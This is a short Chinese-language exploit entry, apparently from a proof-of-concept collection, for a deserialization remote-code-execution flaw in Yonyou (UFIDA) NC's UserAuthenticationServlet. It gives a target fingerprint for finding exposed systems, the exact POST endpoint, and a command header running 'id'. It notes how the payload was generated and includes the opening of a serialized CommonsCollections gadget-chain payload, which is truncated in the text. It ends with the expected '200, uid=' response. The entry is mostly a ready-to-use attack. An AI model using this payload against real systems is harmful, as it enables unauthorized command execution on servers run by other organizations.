# 用友NCUserAuthenticationServlet反序列化RCE漏洞

- **系统**：用友　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /servlet/~uapim/nc.bs.pub.im.UserAuthenticationServlet HTTP/1.1`

**请求体 / payload**
```
yakit生成序列化数据，cc6打dns
tomcat回显链
Host:
Cmd: id
{{unquote("\xac\xed\x00\x05sr\x00\x11java.util.HashSet\xbaD\x85\x95\x96\xb8\xb74\x03\x00\x00xpw\x0c\x00\x00\x00\x02?@\x00\x00\x00\x00\x00\x01sr\x004org.apache.commons.collections.keyvalue.TiedMapEntry\x8a\xad\xd2\x9b9\xc1\x1f\xdb\x02\x00\x02L\x00\x03keyt\x00\x12Ljava/lang/Object;L\x00\x03mapt\x00\x0fLjava/util/Map;xpt\x00\x03foosr\x00*org.apache.commons.collections.map.LazyMapn\xe5\x94\x82\x9ey\x10\x94\x03\x00\x01L\x00\x07factoryt\x00,Lorg/apache/commons/collections/Transformer;xpsr\x00:org.apache.commons.collections.functors.ChainedTransformer0\xc7…（脚本共 20529 字，完整版见原文）
```
- **预期**：200　|　uid=